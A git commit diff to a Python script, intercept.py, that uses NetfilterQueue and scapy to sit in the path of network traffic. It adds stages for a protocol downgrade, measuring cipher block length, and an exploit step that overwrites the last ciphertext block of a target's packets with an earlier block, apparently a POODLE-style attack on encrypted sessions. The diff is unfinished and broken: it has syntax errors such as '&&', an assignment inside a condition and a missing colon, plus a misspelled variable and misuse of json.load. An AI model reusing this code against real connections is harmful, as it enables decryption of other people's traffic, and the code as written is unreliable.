d702cc4a90a398d764d0f4b5bd3990f411e16a24
Peter Steffey <steffeydev@icloud.com>
2018-11-13 15:44:54 -0800

    adding more code

--- intercept.py
+++ intercept.py
@@ -2,28 +2,63 @@
 
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
+import threading
+import json
+from enum import Enum
 
-def client_to_server(packet):
+Stage = Enum('Stage', 'downgrade_dance block_length exploit')
+stage = Stage.exploit
+
+block_size = 16
+
+# for block_length stage
+ciphertext_length = 0
+
+# For exploit stage
+block_to_move = 2
+
+
+
+load_layer('tls')
+
+config = json.load(open('config.json', 'r').read())
+
+def copy_block(arr, copy_index, target_index):
+	arr[target_index:(target_index+block_size)] = arr[copy_index:(copy_index+bblock_size)]
+	return arr
+
+def callback(packet):
 	pkt = IP(packet.get_payload())
-	print(pkt)
+
+	if (pkt.src == config.target && stage == Stage.exploit):
+		start_index = block_size * block_to_move
+		last_block_index = len(pkt) - block_size
+		packet.set_payload(bytes(copy_block(list(packet.get_payload()), start_index, last_block_index)))
+		packet.accept()
+		return
+	elif (pkt.src == config.target && stage = Stage.block_length)
+		if ciphertext_length > 0:
+			if len(pkt) > ciphertext_length:
+				block_size = len(pkt) - ciphertext_length
+		else:
+			ciphertext_length = len(pkt)
+		packet.drop()
+		return
+		
+		
+	print(pkt.src + " -> " + pkt.dst)
 	print(pkt[0].summary())
+	if (pkt.dst == '192.168.1.160'):
+		pass
+		#print(pkt)
+		#print(pkt[0].show())
+
 	#print(pkt[TCP].payload)
 	#packet.set_payload(str(pkt))
 	packet.accept()
 
-def server_to_client(packet):
-	pkt = IP(packet.get_payload())
-	print(pkt)
-	print(pkt[0].summary())
-	packet.accept()
-
 nfqueue = NetfilterQueue()
-
-# client to server intercept
-nfqueue.bind(0, client_to_server)
-
-# server to client intercept
-nfqueue.bind(1, server_to_client)
+nfqueue.bind(0, callback)
 
 try:
 	nfqueue.run()
